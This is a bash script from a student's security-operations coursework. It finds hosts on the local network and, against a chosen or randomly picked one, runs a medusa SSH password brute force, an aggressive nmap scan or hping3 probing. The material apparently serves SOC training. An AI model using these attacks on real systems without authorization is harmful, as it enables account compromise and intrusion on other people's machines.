#! /bin/bash

echo 'Student name: Michelle Lai'
echo 'Student code: S23'
echo 'Class code: CFC020823'
echo 'Lecturer name: James'
echo 'Title: Attack Script for SOC project'
echo ' '

#wkpass function is for password cracking on the target machine.
function wkpass()	
{
	echo "Password cracking in progress.."
		medusa -h $ipx -U usernames.txt -P password.txt -M ssh -t 10 -O passwordfound.txt
		echo "results for password cracking saved in passwordfound.txt"
	}
	
#openports function is for checking open ports on the target machine.
function openports()	
{
	echo "Searching for open ports.."
		sudo nmap -A $ipx 	#-A performs an aggressive scan to perform OS and service detection.
	}

#pack function sends custom ICMP/UDP/TCP packets and display target replies.
function pack()	
{
	echo "Sending packets.."
		hping3 --traceroute -V -1 $ipx 
	}

#The system should display the IP addresses on the network
ipaddr=$(arp -a | awk '{print$2}'| tr '(' ' ' | tr ')' ' ')
echo "These are the ip addresses connected to your network: "
echo "$ipaddr"

#Allow the user to choose a target or random from the found Ips as a target machine
echo ' '
echo 'Please make a choice for your target machine: 
A)IP address provided by user
B)Random IP address connected to network'
read ans
	
	case $ans in
		A|a)
			echo "Specify a IP address to target: "   #user to input an ip address
			read ipx 
	;;
		B|b)
			ipx=$(shuf -n1 -e $ipaddr)	#random ip address found in the network will be chosen
			echo "$ipx"
	;;
		esac
echo ' '

#Each attack should have a description to display once chosen
#Display a list of all possible attacks with descriptions
echo "What does the user want to do?
A)Medusa - password cracking on the target's machine
B)Nmap - to find out which ports are open in the target's machine
C)Hping3 - send custom ICMP/UDP/TCP packets and to display target replies like ping does with ICMP replies
D)Randomised Attack"
read attack

#Create attack scripts that can simulate at least three (3) different attack types using functions.
#The user can choose a specific attack or random from the list

	case $attack in
		A|a) #password cracking on the target machine.
		wkpass
	;;
		B|b) #checking open ports.
		openports
	;;
		C|c) #sends custom ICMP/UDP/TCP packets and display target replies.
		pack
	;;
		D|d) #random attack from choice A,B or C chosen
		echo "Random attack chosen!"
		atk=( "wkpass" "openports" "pack" )
		$(shuf -n1 -e "${atk[@]}" )
	;;
		*)	#exit when choice A,B,C or D not chosen
		echo "Wrong Input given!"
		exit
		;;
	esac




